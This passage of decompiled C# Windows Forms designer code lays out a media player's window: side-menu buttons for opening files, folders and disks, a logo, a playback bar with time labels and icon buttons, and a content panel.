		((Control)button5).set_ForeColor(Color.Silver);
		((Control)button5).set_Location(new Point(0, 120));
		((Control)button5).set_Name("button5");
		((Control)button5).set_Padding(new Padding(35, 0, 0, 0));
		((Control)button5).set_Size(new Size(233, 40));
		((Control)button5).set_TabIndex(3);
		((Control)button5).set_Text("Open recent media");
		((ButtonBase)button5).set_TextAlign((ContentAlignment)16);
		((ButtonBase)button5).set_UseVisualStyleBackColor(true);
		((Control)button5).add_Click((EventHandler)button5_Click);
		((Control)button4).set_Dock((DockStyle)1);
		((ButtonBase)button4).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button4).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button4).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button4).set_FlatStyle((FlatStyle)0);
		((Control)button4).set_ForeColor(Color.Silver);
		((Control)button4).set_Location(new Point(0, 80));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Padding(new Padding(35, 0, 0, 0));
		((Control)button4).set_Size(new Size(233, 40));
		((Control)button4).set_TabIndex(2);
		((Control)button4).set_Text("Open Disk");
		((ButtonBase)button4).set_TextAlign((ContentAlignment)16);
		((ButtonBase)button4).set_UseVisualStyleBackColor(true);
		((Control)button4).add_Click((EventHandler)button4_Click);
		((Control)button3).set_Dock((DockStyle)1);
		((ButtonBase)button3).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button3).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button3).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button3).set_FlatStyle((FlatStyle)0);
		((Control)button3).set_ForeColor(Color.Silver);
		((Control)button3).set_Location(new Point(0, 40));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Padding(new Padding(35, 0, 0, 0));
		((Control)button3).set_Size(new Size(233, 40));
		((Control)button3).set_TabIndex(1);
		((Control)button3).set_Text("Open folder");
		((ButtonBase)button3).set_TextAlign((ContentAlignment)16);
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((Control)button2).set_Dock((DockStyle)1);
		((ButtonBase)button2).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)button2).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button2).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(42, 38, 46));
		((ButtonBase)button2).set_FlatStyle((FlatStyle)0);
		((Control)button2).set_ForeColor(Color.Silver);
		((Control)button2).set_Location(new Point(0, 0));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Padding(new Padding(35, 0, 0, 0));
		((Control)button2).set_Size(new Size(233, 40));
		((Control)button2).set_TabIndex(0);
		((Control)button2).set_Text("Open files");
		((ButtonBase)button2).set_TextAlign((ContentAlignment)16);
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)btnMedia).set_Dock((DockStyle)1);
		((ButtonBase)btnMedia).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)btnMedia).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(23, 21, 32));
		((ButtonBase)btnMedia).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(24, 22, 34));
		((ButtonBase)btnMedia).set_FlatStyle((FlatStyle)0);
		((Control)btnMedia).set_ForeColor(Color.Silver);
		((ButtonBase)btnMedia).set_Image((Image)componentResourceManager.GetObject("btnMedia.Image"));
		((ButtonBase)btnMedia).set_ImageAlign((ContentAlignment)16);
		((Control)btnMedia).set_Location(new Point(0, 92));
		((Control)btnMedia).set_Name("btnMedia");
		((Control)btnMedia).set_Padding(new Padding(5, 0, 0, 0));
		((Control)btnMedia).set_Size(new Size(233, 45));
		((Control)btnMedia).set_TabIndex(1);
		((Control)btnMedia).set_Text("  Media");
		((ButtonBase)btnMedia).set_TextAlign((ContentAlignment)16);
		((ButtonBase)btnMedia).set_TextImageRelation((TextImageRelation)4);
		((ButtonBase)btnMedia).set_UseVisualStyleBackColor(true);
		((Control)btnMedia).add_Click((EventHandler)btnMedia_Click);
		((Control)panelLogo).get_Controls().Add((Control)(object)pictureBox1);
		((Control)panelLogo).set_Dock((DockStyle)1);
		((Control)panelLogo).set_Location(new Point(0, 0));
		((Control)panelLogo).set_Name("panelLogo");
		((Control)panelLogo).set_Size(new Size(233, 92));
		((Control)panelLogo).set_TabIndex(0);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(36, 15));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(159, 60));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)panelPlayer).set_BackColor(Color.FromArgb(23, 21, 32));
		((Control)panelPlayer).get_Controls().Add((Control)(object)label3);
		((Control)panelPlayer).get_Controls().Add((Control)(object)panel4);
		((Control)panelPlayer).get_Controls().Add((Control)(object)label2);
		((Control)panelPlayer).get_Controls().Add((Control)(object)label1);
		((Control)panelPlayer).get_Controls().Add((Control)(object)panel2);
		((Control)panelPlayer).get_Controls().Add((Control)(object)pictureBox8);
		((Control)panelPlayer).get_Controls().Add((Control)(object)pictureBox7);
		((Control)panelPlayer).get_Controls().Add((Control)(object)pictureBox6);
		((Control)panelPlayer).get_Controls().Add((Control)(object)pictureBox5);
		((Control)panelPlayer).get_Controls().Add((Control)(object)pictureBox4);
		((Control)panelPlayer).get_Controls().Add((Control)(object)pictureBox3);
		((Control)panelPlayer).get_Controls().Add((Control)(object)pictureBox2);
		((Control)panelPlayer).set_Dock((DockStyle)2);
		((Control)panelPlayer).set_Location(new Point(250, 431));
		((Control)panelPlayer).set_Name("panelPlayer");
		((Control)panelPlayer).set_Size(new Size(684, 130));
		((Control)panelPlayer).set_TabIndex(1);
		((Control)label3).set_Anchor((AnchorStyles)0);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_ForeColor(Color.LightGray);
		((Control)label3).set_Location(new Point(595, 36));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(28, 17));
		((Control)label3).set_TabIndex(11);
		((Control)label3).set_Text("0%");
		((Control)panel4).set_Anchor((AnchorStyles)0);
		((Control)panel4).set_BackColor(Color.FromArgb(36, 33, 50));
		((Control)panel4).get_Controls().Add((Control)(object)panel5);
		((Control)panel4).set_Location(new Point(389, 42));
		((Control)panel4).set_Name("panel4");
		((Control)panel4).set_Size(new Size(200, 5));
		((Control)panel4).set_TabIndex(10);
		((Control)panel5).set_BackColor(Color.FromArgb(36, 33, 50));
		((Control)panel5).set_Location(new Point(0, -13));
		((Control)panel5).set_Name("panel5");
		((Control)panel5).set_Size(new Size(564, 5));
		((Control)panel5).set_TabIndex(9);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_ForeColor(Color.LightGray);
		((Control)label2).set_Location(new Point(12, 84));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(44, 17));
		((Control)label2).set_TabIndex(10);
		((Control)label2).set_Text("00:00");
		((Control)label1).set_Anchor((AnchorStyles)9);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_ForeColor(Color.LightGray);
		((Control)label1).set_Location(new Point(628, 84));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(44, 17));
		((Control)label1).set_TabIndex(9);
		((Control)label1).set_Text("00:00");
		((Control)panel2).set_Anchor((AnchorStyles)13);
		((Control)panel2).set_BackColor(Color.FromArgb(36, 33, 50));
		((Control)panel2).get_Controls().Add((Control)(object)panel3);
		((Control)panel2).set_Location(new Point(58, 91));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(564, 5));
		((Control)panel2).set_TabIndex(8);
		((Control)panel3).set_BackColor(Color.FromArgb(36, 33, 50));
		((Control)panel3).set_Location(new Point(0, -13));
		((Control)panel3).set_Name("panel3");
		((Control)panel3).set_Size(new Size(564, 5));
		((Control)panel3).set_TabIndex(9);
		((Control)pictureBox8).set_Anchor((AnchorStyles)0);
		pictureBox8.set_Image((Image)componentResourceManager.GetObject("pictureBox8.Image"));
		((Control)pictureBox8).set_Location(new Point(359, 33));
		((Control)pictureBox8).set_Name("pictureBox8");
		((Control)pictureBox8).set_Size(new Size(24, 24));
		pictureBox8.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox8.set_TabIndex(7);
		pictureBox8.set_TabStop(false);
		((Control)pictureBox7).set_Anchor((AnchorStyles)0);
		((Control)pictureBox7).set_Cursor(Cursors.get_Hand());
		pictureBox7.set_Image((Image)componentResourceManager.GetObject("pictureBox7.Image"));
		((Control)pictureBox7).set_Location(new Point(83, 33));
		((Control)pictureBox7).set_Name("pictureBox7");
		((Control)pictureBox7).set_Size(new Size(24, 24));
		pictureBox7.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox7.set_TabIndex(6);
		pictureBox7.set_TabStop(false);
		((Control)pictureBox6).set_Anchor((AnchorStyles)0);
		((Control)pictureBox6).set_Cursor(Cursors.get_Hand());
		pictureBox6.set_Image((Image)componentResourceManager.GetObject("pictureBox6.Image"));
		((Control)pictureBox6).set_Location(new Point(128, 33));
		((Control)pictureBox6).set_Name("pictureBox6");
		((Control)pictureBox6).set_Size(new Size(24, 24));
		pictureBox6.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox6.set_TabIndex(5);
		pictureBox6.set_TabStop(false);
		((Control)pictureBox5).set_Anchor((AnchorStyles)0);
		((Control)pictureBox5).set_Cursor(Cursors.get_Hand());
		pictureBox5.set_Image((Image)componentResourceManager.GetObject("pictureBox5.Image"));
		((Control)pictureBox5).set_Location(new Point(320, 33));
		((Control)pictureBox5).set_Name("pictureBox5");
		((Control)pictureBox5).set_Size(new Size(24, 24));
		pictureBox5.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox5.set_TabIndex(4);
		pictureBox5.set_TabStop(false);
		((Control)pictureBox4).set_Anchor((AnchorStyles)0);
		((Control)pictureBox4).set_Cursor(Cursors.get_Hand());
		pictureBox4.set_Image((Image)componentResourceManager.GetObject("pictureBox4.Image"));
		((Control)pictureBox4).set_Location(new Point(170, 33));
		((Control)pictureBox4).set_Name("pictureBox4");
		((Control)pictureBox4).set_Size(new Size(24, 24));
		pictureBox4.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox4.set_TabIndex(3);
		pictureBox4.set_TabStop(false);
		((Control)pictureBox3).set_Anchor((AnchorStyles)0);
		((Control)pictureBox3).set_Cursor(Cursors.get_Hand());
		pictureBox3.set_Image((Image)componentResourceManager.GetObject("pictureBox3.Image"));
		((Control)pictureBox3).set_Location(new Point(279, 33));
		((Control)pictureBox3).set_Name("pictureBox3");
		((Control)pictureBox3).set_Size(new Size(24, 24));
		pictureBox3.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox3.set_TabIndex(2);
		pictureBox3.set_TabStop(false);
		((Control)pictureBox2).set_Anchor((AnchorStyles)0);
		((Control)pictureBox2).set_Cursor(Cursors.get_Hand());
		pictureBox2.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)pictureBox2).set_Location(new Point(221, 29));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(32, 32));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox2.set_TabIndex(1);
		pictureBox2.set_TabStop(false);
		((Control)panelChildForm).set_BackColor(Color.FromArgb(32, 30, 45));
		((Control)panelChildForm).get_Controls().Add((Control)(object)pictureBox9);
		((Control)panelChildForm).set_Dock((DockStyle)5);
		((Control)panelChildForm).set_Location(new Point(250, 0));
		((Control)panelChildForm).set_Name("panelChildForm");
		((Control)panelChildForm).set_Size(new Size(684, 431));
		((Control)panelChildForm).set_TabIndex(2);
		((Control)pictureBox9).set_Anchor((AnchorStyles)0);
		pictureBox9.set_Image((Image)componentResourceManager.GetObject("pictureBox9.Image"));
		((Control)pictureBox9).set_Location(new Point(221, 102));
		((Control)pictureBox9).set_Name("pictureBox9");
		((Control)pictureBox9).set_Size(new Size(226, 218));
		pictureBox9.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox9.set_TabIndex(2);
		pictureBox9.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.Control);
		((Form)this).set_ClientSize(new Size(934, 561));
		((Control)this).get_Controls().Add((Control)(object)panelChildForm);
		((Control)this).get_Controls().Add((Control)(object)panelPlayer);
		((Control)this).get_Controls().Add((Control)(object)panelSideMenu);
		((Control)this).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(4));
		((Control)this).set_MinimumSize(new Size(950, 600));
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)panelSideMenu).ResumeLayout(false);
		((Control)panelToolsSubMenu).ResumeLayout(false);
		((Control)panelPlaylistSubMenu).ResumeLayout(false);
		((Control)panelMediaSubMenu).ResumeLayout(false);
		((Control)panelLogo).ResumeLayout(false);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)panelPlayer).ResumeLayout(false);
		((Control)panelPlayer).PerformLayout();
		((Control)panel4).ResumeLayout(false);
		((Control)panel2).ResumeLayout(false);
		((ISupportInitialize)pictureBox8).EndInit();
		((ISupportInitialize)pictureBox7).EndInit();
		((ISupportInitialize)pictureBox6).EndInit();
		((ISupportInitialize)pictureBox5).EndInit();
		((ISupportInitialize)pictureBox4).EndInit();
		((ISupportInitialize)pictureBox3).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)panelChildForm).ResumeLayout(false);
		((Control)panelChildForm).PerformLayout();
		((ISupportInitialize)pictureBox9).EndInit();
		((Control)this).ResumeLayout(false);
	}
}
